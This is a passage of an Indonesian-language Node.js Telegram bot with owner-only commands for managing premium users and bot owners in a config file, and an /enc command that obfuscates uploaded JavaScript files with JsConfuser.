      "⚠️ Permintaan Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${userId} sudah
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN
│────────────────
│ ID: ${userId}
│ Status: Premium User
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS
│────────────────
│ User ${userId} tidak
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS  
│────────────────
│ ID: ${userId}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Permintaan Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/enc/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMessage = msg.reply_to_message;
  
  if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
    return bot.sendMessage(chatId, '[ ! ] Reply .js');
  }

  const fileId = replyMessage.document.file_id;
  const fileName = replyMessage.document.file_name;
      
  const fileLink = await bot.getFileLink(fileId);
  const response = await axios.get(fileLink, { 
    responseType: 'arraybuffer'
  });
  
  const codeBuffer = Buffer.from(response.data);
  const tempFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(tempFilePath, codeBuffer);
  
  bot.sendMessage(chatId, "[ ! ] WAITTING FOR PROCCESS....");
  const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function () {
      const originalString = "肀IbraDecode金" + "肀IbraDecode金";
        function removeUnwantedChars(input) {
          return input.replace(/[^a-zA-Z肀angkasa金]/g, '');
        }
        function randomString(length) {
          let result = '';
          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
          for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
          }
          return result;
        }
        return removeUnwantedChars(originalString) + randomString(2);
      }, 
      renameVariables: true,
      renameGlobals: true,
      stringEncoding: true,
      stringSplitting: 0.0,
      stringConcealing: true,
      stringCompression: true,
      duplicateLiteralsRemoval: 1.0,
      shuffle: { hash: 0.0, true: 0.0 },
      stack: true,
      controlFlowFlattening: 1.0,
      opaquePredicates: 0.9,
      deadCode: 0.0,
      dispatcher: true,
      rgf: false,
      calculator: true,
      hexadecimalNumbers: true,
      movedDeclarations: true,
      objectExtraction: true,
      globalConcealing: true
    });
  
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);
      
    bot.sendDocument(chatId, encryptedFilePath, {
      caption: `[ ! ] SUCCESSFULLY ENC HARD!!`
    });
  });
